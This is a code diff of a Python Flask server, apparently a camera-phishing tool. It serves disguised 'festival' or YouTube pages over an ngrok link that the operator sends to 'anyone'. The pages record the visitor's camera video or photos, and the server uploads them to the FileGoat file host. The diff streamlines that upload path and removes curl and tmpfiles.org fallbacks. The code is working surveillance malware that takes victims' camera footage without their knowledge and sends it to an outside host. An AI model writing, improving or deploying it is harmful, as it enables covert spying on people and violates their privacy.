@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - With FileGoat Cloud Upload (Fixed)
+Gift Video Receiver Server - With FileGoat Cloud Upload (Full Integration)
 """
 
 import os
@@ -17,245 +17,176 @@ from datetime import datetime
 from pathlib import Path
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
+from werkzeug.utils import secure_filename
 
 # ============================================
-# Configuration
+# CONFIG
 # ============================================
-UPLOAD_FOLDER = 'gift_videos'
+UPLOAD_FOLDER = Path("gift_videos")
 PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
-# FileGoat configuration
+# FileGoat expiry options
 FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days
 
+# Create upload directory
+UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
+
 # ============================================
-# Flask Application
+# FLASK APP
 # ============================================
 app = Flask(__name__)
 CORS(app)
 
+# Allow large files (5GB)
+app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
+
 received_files = []
 uploaded_links = []
 
+# ============================================
+# FILEGOAT UPLOAD FUNCTION
+# ============================================
+
 def upload_to_filegoat(filepath, expiry_days=7):
     """
-    Upload a file to FileGoat using the correct API endpoint.
+    Upload image/video to FileGoat.
     
-    Args:
-        filepath: Path to the file to upload
-        expiry_days: Days until file expires (1, 7, 30, 90)
-    
-    Returns:
-        dict: {'success': bool, 'url': shareable_url, 'expiry': str}
+    expiry_days: 1, 7, 30, 90
     """
-    try:
-        filename = os.path.basename(filepath)
-        file_size = os.path.getsize(filepath)
-        print(f"   ☁️ Uploading {filename} ({file_size:,} bytes) to FileGoat...")
-        
-        # FileGoat API endpoint - using the correct upload endpoint
-        url = "https://filego.at/upload"
-        
-        # Prepare headers - FileGoat expects these
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Origin': 'https://filego.at',
-            'Referer': 'https://filego.at/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
+    filepath = Path(filepath)
+
+    if not filepath.exists():
+        return {
+            "success": False,
+            "error": "File does not exist"
         }
-        
-        # Prepare the file and data
-        with open(filepath, 'rb') as f:
-            files = {'file': (filename, f, 'application/octet-stream')}
-            # FileGoat expects expiry in seconds
-            data = {'expiry': expiry_days * 24 * 60 * 60}
-            
-            # First, try with the file and data
+
+    filename = filepath.name
+    file_size = filepath.stat().st_size
+
+    print()
+    print("=" * 50)
+    print("☁️ FILEGOAT UPLOAD")
+    print("=" * 50)
+    print(f"📁 File     : {filename}")
+    print(f"📊 Size     : {file_size:,} bytes")
+    print(f"⏰ Expiry   : {expiry_days} days")
+    print()
+
+    # FileGoat upload endpoint
+    url = "https://filego.at/upload"
+
+    expiry_seconds = expiry_days * 24 * 60 * 60
+
+    headers = {
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
+        ),
+        "Accept": "*/*",
+        "Origin": "https://filego.at",
+        "Referer": "https://filego.at/",
+    }
+
+    try:
+        with open(filepath, "rb") as file:
+            files = {
+                "file": (
+                    filename,
+                    file,
+                    "application/octet-stream"
+                )
+            }
+            data = {
+                "expiry": str(expiry_seconds)
+            }
+
+            print("⬆️ Uploading...")
+
             response = requests.post(
                 url,
                 files=files,
                 data=data,
                 headers=headers,
-                timeout=120
+                timeout=600
             )
-        
-        # If we get a 403, try with a different approach
-        if response.status_code == 403:
-            print(f"   ⚠️ Initial upload failed with 403, trying alternative method...")
-            
-            # Alternative: Use multipart form with different format
-            with open(filepath, 'rb') as f:
-                files = {'file': (filename, f)}
-                # Don't send data as form, send as query parameter
-                response = requests.post(
-                    f"{url}?expiry={expiry_days * 24 * 60 * 60}",
-                    files=files,
-                    headers={
-                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-                        'Accept': 'application/json',
-                        'Origin': 'https://filego.at',
-                        'Referer': 'https://filego.at/',
-                    },
-                    timeout=120
-                )
-        
-        # If still failing, try without files dict
-        if response.status_code == 403:
-            print(f"   ⚠️ Alternative method failed, trying direct POST...")
-            
-            with open(filepath, 'rb') as f:
-                file_data = f.read()
-                response = requests.post(
-                    f"{url}?expiry={expiry_days * 24 * 60 * 60}",
-                    files={'file': (filename, file_data, 'application/octet-stream')},
-                    headers={
-                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-                        'Accept': 'application/json',
-                        'Referer': 'https://filego.at/',
-                    },
-                    timeout=120
-                )
-        
-        if response.status_code == 200:
-            try:
-                result = response.json()
-                if result.get('url'):
-                    return {
-                        'success': True,
-                        'url': result.get('url'),
-                        'expiry': f"{expiry_days} days",
-                        'delete_url': result.get('delete_url'),
-                        'filename': filename,
-                        'size': file_size
-                    }
-                else:
-                    print(f"   ⚠️ No URL in response: {result}")
-                    return {'success': False, 'error': 'No URL in response'}
-            except json.JSONDecodeError:
-                # If response is not JSON, try to extract URL from HTML
-                html_content = response.text
-                # Look for filego.at link in the response
-                import re
-                url_match = re.search(r'https://filego\.at/f/[a-zA-Z0-9]+', html_content)
-                if url_match:
-                    return {
-                        'success': True,
-                        'url': url_match.group(0),
-                        'expiry': f"{expiry_days} days",
-                        'filename': filename,
-                        'size': file_size
-                    }
-                else:
-                    print(f"   ⚠️ Could not extract URL from response")
-                    return {'success': False, 'error': 'Could not extract URL'}
-        else:
-            print(f"   ❌ Upload failed with status {response.status_code}")
-            print(f"   📋 Response: {response.text[:500]}")
-            return {'success': False, 'error': f'HTTP {response.status_code}'}
-            
+
+        print(f"📡 HTTP Status: {response.status_code}")
+
+        # Check HTTP status
+        if response.status_code != 200:
+            print("❌ Upload failed")
+            print("Server response:")
+            print(response.text[:1000])
+
+            return {
+                "success": False,
+                "error": f"HTTP {response.status_code}",
+                "response": response.text[:1000]
+            }
+
+        # Parse response
+        try:
+            result = response.json()
+        except ValueError:
+            print("⚠️ Server did not return JSON")
+            return {
+                "success": False,
+                "error": "Server returned non-JSON response",
+                "response": response.text[:1000]
+            }
+
+        print("📦 Server response:")
+        print(result)
+
+        # Find URL
+        cloud_url = (
+            result.get("url")
+            or result.get("share_url")
+            or result.get("download_url")
+        )
+
+        if not cloud_url:
+            return {
+                "success": False,
+                "error": "Upload succeeded but no URL was returned",
+                "response": result
+            }
+
+        print()
+        print("✅ UPLOAD SUCCESS")
+        print(f"🔗 URL: {cloud_url}")
+        print(f"⏰ Expires: {expiry_days} days")
+        print()
+
+        return {
+            "success": True,
+            "url": cloud_url,
+            "expiry": f"{expiry_days} days",
+            "filename": filename,
+            "size": file_size,
+            "response": result
+        }
+
     except requests.exceptions.Timeout:
-        print(f"   ❌ Upload timeout - file may be too large")
-        return {'success': False, 'error': 'Timeout'}
-    except requests.exceptions.ConnectionError:
-        print(f"   ❌ Connection error - check internet")
-        return {'success': False, 'error': 'Connection error'}
+        print("❌ Upload timed out")
+        return {"success": False, "error": "Upload timeout"}
+
+    except requests.exceptions.ConnectionError as e:
+        print("❌ Internet connection error")
+        print(e)
+        return {"success": False, "error": "Connection error"}
+
     except Exception as e:
-        print(f"   ❌ Upload error: {e}")
-        return {'success': False, 'error': str(e)}
+        print("❌ Upload error:")
+        print(e)
+        return {"success": False, "error": str(e)}
 
 # ============================================
-# Alternative: Try using curl as fallback
+# ROUTES
 # ============================================
-def upload_to_filegoat_curl(filepath, expiry_days=7):
-    """
-    Upload using curl command as fallback.
-    """
-    try:
-        import subprocess
-        filename = os.path.basename(filepath)
-        print(f"   🔄 Trying curl fallback for {filename}...")
-        
-        expiry_seconds = expiry_days * 24 * 60 * 60
-        
-        # Use curl to upload
-        cmd = [
-            'curl',
-            '-s',
-            '-X', 'POST',
-            'https://filego.at/upload',
-            '-F', f'file=@{filepath}',
-            '-F', f'expiry={expiry_seconds}',
-            '-H', 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            '-H', 'Accept: application/json',
-            '-H', 'Referer: https://filego.at/',
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-        
-        if result.returncode == 0:
-            try:
-                import json
-                data = json.loads(result.stdout)
-                if data.get('url'):
-                    return {
-                        'success': True,
-                        'url': data.get('url'),
-                        'expiry': f"{expiry_days} days",
-                        'filename': filename
-                    }
-            except:
-                # Try to extract URL from output
-                import re
-                url_match = re.search(r'https://filego\.at/f/[a-zA-Z0-9]+', result.stdout)
-                if url_match:
-                    return {
-                        'success': True,
-                        'url': url_match.group(0),
-                        'expiry': f"{expiry_days} days",
-                        'filename': filename
-                    }
-        
-        return {'success': False, 'error': 'Curl upload failed'}
-    except Exception as e:
-        return {'success': False, 'error': f'Curl error: {e}'}
-
-# ============================================
-# Try alternative service if FileGoat fails
-# ============================================
-def upload_to_alternative(filepath, expiry_days=7):
-    """
-    Fallback to alternative file sharing service (tmpfiles.org)
-    """
-    try:
-        import requests
-        filename = os.path.basename(filepath)
-        print(f"   🔄 Trying alternative service (tmpfiles.org)...")
-        
-        with open(filepath, 'rb') as f:
-            response = requests.post(
-                "https://tmpfiles.org/api/v1/upload",
-                files={"file": (filename, f)},
-                timeout=60
-            )
-        
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('url'):
-                return {
-                    'success': True,
-                    'url': data.get('url'),
-                    'expiry': f"{expiry_days} days (tmpfiles.org)",
-                    'filename': filename
-                }
-        
-        return {'success': False, 'error': 'Alternative upload failed'}
-    except Exception as e:
-        return {'success': False, 'error': f'Alternative error: {e}'}
 
 @app.route('/festival')
 def festival_page():
@@ -276,12 +207,13 @@ def youtube_page():
 @app.route('/upload', methods=['POST'])
 def upload_media():
     try:
+        # Check file
         if 'media' not in request.files:
             return jsonify({'error': 'No media file'}), 400
         
         media_file = request.files['media']
         if media_file.filename == '':
-            return jsonify({'error': 'No filename'}), 400
+            return jsonify({'error': 'Empty filename'}), 400
 
         media_type = request.form.get('type', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -291,18 +223,24 @@ def upload_media():
         else:
             ext = 'webm'
         
-        filename = f"{media_type}_{timestamp}.{ext}"
-        filepath = os.path.join(UPLOAD_FOLDER, filename)
-
-        # Save file locally first
-        media_file.save(filepath)
+        # Secure filename
+        safe_name = secure_filename(media_file.filename)
+        if not safe_name:
+            safe_name = f"{media_type}_{timestamp}.{ext}"
+        else:
+            name, ext_orig = os.path.splitext(safe_name)
+            safe_name = f"{name}_{timestamp}{ext_orig}"
+        
+        # Save locally
+        local_path = UPLOAD_FOLDER / safe_name
+        media_file.save(local_path)
         
         file_info = {
-            'filename': filename,
-            'path': filepath,
+            'filename': safe_name,
+            'path': str(local_path.absolute()),
             'type': media_type,
             'timestamp': timestamp,
-            'size': os.path.getsize(filepath),
+            'size': local_path.stat().st_size,
             'cloud_url': None,
             'expires': None,
             'delete_url': None
@@ -311,89 +249,41 @@ def upload_media():
         # ============================================
         # Upload to FileGoat
         # ============================================
-        upload_success = False
+        print(f"\n📥 Received file: {safe_name}")
         
-        # Try primary method
+        # Get expiry from request or use default
+        expiry_days = request.form.get('expiry', str(FILEGOAT_EXPIRY_DAYS))
         try:
-            result = upload_to_filegoat(filepath, FILEGOAT_EXPIRY_DAYS)
+            expiry_days = int(expiry_days)
+        except ValueError:
+            expiry_days = FILEGOAT_EXPIRY_DAYS
+        
+        if expiry_days not in [1, 7, 30, 90]:
+            expiry_days = 7
+        
+        cloud_result = upload_to_filegoat(local_path, expiry_days)
+        
+        if cloud_result.get('success'):
+            file_info['cloud_url'] = cloud_result.get('url')
+            file_info['expires'] = cloud_result.get('expiry')
             
-            if result and result.get('success'):
-                file_info['cloud_url'] = result.get('url')
-                file_info['expires'] = result.get('expiry')
-                file_info['delete_url'] = result.get('delete_url')
-                
-                print(f"   ✅ Uploaded to FileGoat!")
-                print(f"   🔗 Link: {result.get('url')}")
-                if result.get('delete_url'):
-                    print(f"   🗑️ Delete URL: {result.get('delete_url')}")
-                print(f"   ⏰ Expires in: {result.get('expiry')}")
-                
-                uploaded_links.append({
-                    'filename': filename,
-                    'url': result.get('url'),
-                    'delete_url': result.get('delete_url'),
-                    'expires': result.get('expiry')
-                })
-                upload_success = True
-            else:
-                print(f"   ⚠️ FileGoat upload failed: {result.get('error', 'Unknown error') if result else 'No result'}")
-                
-        except Exception as e:
-            print(f"   ❌ FileGoat upload error: {e}")
-        
-        # Try curl fallback if primary failed
-        if not upload_success:
-            try:
-                print(f"   🔄 Trying curl fallback...")
-                result = upload_to_filegoat_curl(filepath, FILEGOAT_EXPIRY_DAYS)
-                if result and result.get('success'):
-                    file_info['cloud_url'] = result.get('url')
-                    file_info['expires'] = result.get('expiry')
-                    
-                    print(f"   ✅ Uploaded using curl!")
-                    print(f"   🔗 Link: {result.get('url')}")
-                    print(f"   ⏰ Expires in: {result.get('expiry')}")
-                    
-                    uploaded_links.append({
-                        'filename': filename,
-                        'url': result.get('url'),
-                        'expires': result.get('expiry')
-                    })
-                    upload_success = True
-            except Exception as e:
-                print(f"   ❌ Curl fallback error: {e}")
-        
-        # Try alternative service if all failed
-        if not upload_success:
-            try:
-                result = upload_to_alternative(filepath, FILEGOAT_EXPIRY_DAYS)
-                if result and result.get('success'):
-                    file_info['cloud_url'] = result.get('url')
-                    file_info['expires'] = result.get('expiry')
-                    
-                    print(f"   ✅ Uploaded to alternative service!")
-                    print(f"   🔗 Link: {result.get('url')}")
-                    print(f"   ⏰ Expires in: {result.get('expiry')}")
-                    
-                    uploaded_links.append({
-                        'filename': filename,
-                        'url': result.get('url'),
-                        'expires': result.get('expiry')
-                    })
-                    upload_success = True
-            except Exception as e:
-                print(f"   ❌ Alternative upload error: {e}")
-        
-        if not upload_success:
-            print(f"   ⚠️ All upload methods failed. File saved locally only.")
+            uploaded_links.append({
+                'filename': safe_name,
+                'url': cloud_result.get('url'),
+                'expires': cloud_result.get('expiry')
+            })
+            
+            print(f"   ☁️ Cloud link: {cloud_result.get('url')}")
+        else:
+            print(f"   ⚠️ Cloud upload failed: {cloud_result.get('error', 'Unknown error')}")
         
         received_files.append(file_info)
         
         # Display received info
         print(f"\n📹 Received {media_type} {len(received_files)}")
-        print(f"   📁 {filename}")
+        print(f"   📁 {safe_name}")
         print(f"   📊 {file_info['size']:,} bytes")
-        print(f"   📂 Full path: {os.path.abspath(filepath)}")
+        print(f"   📂 Full path: {file_info['path']}")
         
         if file_info.get('cloud_url'):
             print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
@@ -402,11 +292,10 @@ def upload_media():
             print(f"   ⚠️ Not uploaded to cloud")
         
         return jsonify({
-            'success': True, 
-            'filename': filename,
+            'success': True,
+            'filename': safe_name,
             'cloud_url': file_info.get('cloud_url'),
-            'delete_url': file_info.get('delete_url'),
-            'local_path': os.path.abspath(filepath)
+            'local_path': file_info.get('path')
         }), 200
 
     except Exception as e:
@@ -422,7 +311,6 @@ def list_files():
 
 @app.route('/cloud-links', methods=['GET'])
 def get_cloud_links():
-    """Get all cloud links"""
     return jsonify({
         'links': uploaded_links,
         'total': len(uploaded_links)
@@ -430,13 +318,13 @@ def get_cloud_links():
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_file(filename):
-    filepath = os.path.join(UPLOAD_FOLDER, filename)
-    if os.path.exists(filepath):
+    filepath = UPLOAD_FOLDER / filename
+    if filepath.exists():
         return send_file(filepath, as_attachment=True)
     return jsonify({'error': 'File not found'}), 404
 
 # ============================================
-# Main Server Class
+# MAIN SERVER CLASS
 # ============================================
 class GiftServer:
     def __init__(self):
@@ -445,9 +333,6 @@ class GiftServer:
         self.port = PORT
         self.running = True
         self.ngrok_ready = threading.Event()
-
-    def setup_directories(self):
-        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
 
     def check_html_files(self):
         if not os.path.exists(FESTIVAL_HTML):
@@ -538,7 +423,7 @@ class GiftServer:
 
     def get_cloud_config(self):
         """Get cloud upload configuration from user"""
-        print("\n☁️ Cloud Upload Configuration:")
+        print("\n☁️ FileGoat Cloud Upload Configuration:")
         print("   Files will be uploaded with auto-expiry")
         print("")
         print("   Select expiry time:")
@@ -642,7 +527,7 @@ class GiftServer:
     def wait_for_files(self):
         print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
         print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
-        print("☁️ Files will be uploaded to cloud (FileGoat or alternative)")
+        print("☁️ Files will be uploaded to FileGoat cloud")
         print("-"*50)
         print("\n⏳ Waiting for first file...")
         print("💡 Files will NOT auto-open. Check the folder or cloud links.")
@@ -657,18 +542,16 @@ class GiftServer:
                     print(f"\n📹 Received {file_info['type']} {current_count}")
                     print(f"   📁 {file_info['filename']}")
                     print(f"   📊 {file_info['size']:,} bytes")
-                    print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
+                    print(f"   📂 Full path: {file_info['path']}")
                     
                     if file_info.get('cloud_url'):
-                        print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
+                        print(f"   ☁️ FileGoat link: {file_info['cloud_url']}")
                         print(f"   ⏰ Expires: {file_info['expires']}")
-                        if file_info.get('delete_url'):
-                            print(f"   🗑️ Delete URL: {file_info['delete_url']}")
                     else:
-                        print(f"   ⚠️ Not uploaded to cloud (saved locally only)")
+                        print(f"   ⚠️ Not uploaded to cloud")
                     
                     print("\n   💡 To download from cloud, use the link above")
-                    print(f"   📁 Or open locally: cd {os.path.abspath(UPLOAD_FOLDER)}")
+                    print(f"   📁 Or open locally: cd {UPLOAD_FOLDER}")
                     last_count = current_count
                     print(f"\n⏳ Waiting for next file...")
                 
@@ -689,8 +572,7 @@ class GiftServer:
 
     def run(self):
         try:
-            self.setup_directories()
-            
+            # Setup
             if not self.check_html_files():
                 return
             
@@ -702,10 +584,9 @@ class GiftServer:
             FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
             print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
             
+            # Main menu
             mode = self.show_main_menu()
-            
             camera = self.get_camera_type()
-            
             capture_mode, duration, photos = self.get_capture_mode()
             
             if mode == 'festival':
@@ -715,10 +596,12 @@ class GiftServer:
                 video_id = self.get_youtube_video()
                 name = None
             
+            # Start server
             self.start_flask()
             if not self.start_ngrok():
                 return
             
+            # Generate link
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
             
             print("\n" + "="*60)
@@ -731,7 +614,7 @@ class GiftServer:
             print(f"   🎯 Mode: {mode_name}")
             print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
             print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days")
+            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
             
             if mode == 'festival':
                 print(f"   🎊 Festival Name: {name}")
@@ -748,7 +631,7 @@ class GiftServer:
                     print(f"   5. Records {duration} second video")
                 else:
                     print(f"   5. Captures {photos} photos")
-                print("   6. Files upload to cloud (FileGoat or alternative)!")
+                print("   6. Files upload to FileGoat cloud!")
             else:
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
@@ -757,16 +640,16 @@ class GiftServer:
                     print(f"   4. Records {duration} second video")
                 else:
                     print(f"   4. Captures {photos} photos")
-                print("   5. Files upload to cloud (FileGoat or alternative)!")
+                print("   5. Files upload to FileGoat cloud!")
             
-            print(f"\n☁️ Cloud: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
+            print(f"\n☁️ FileGoat: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
             print("   Links will be shown when files are received")
             
             print("\n💡 Files saved locally too. Check the folder:")
-            print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
+            print(f"   📁 cd {UPLOAD_FOLDER}")
             print("="*60)
             print("\n📋 Link printed above - copy it manually")
-            print(f"📁 Files saved in: {os.path.abspath(UPLOAD_FOLDER)}/")
+            print(f"📁 Files saved in: {UPLOAD_FOLDER.absolute()}")
             
             self.wait_for_files()
             
